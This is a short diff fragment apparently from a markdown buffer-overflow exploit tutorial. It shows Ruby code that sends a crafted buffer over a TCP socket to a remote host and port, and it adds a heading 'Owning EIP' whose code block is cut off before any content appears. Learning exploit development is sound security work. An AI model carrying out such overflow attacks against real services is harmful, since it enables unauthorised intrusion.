@@ -51,3 +51,5 @@ require 'socket'
 
 TCPSocket.open(RHOST,RPORT){ |s| s.puts buff}
 ```
+### Owning EIP
+```Ruby
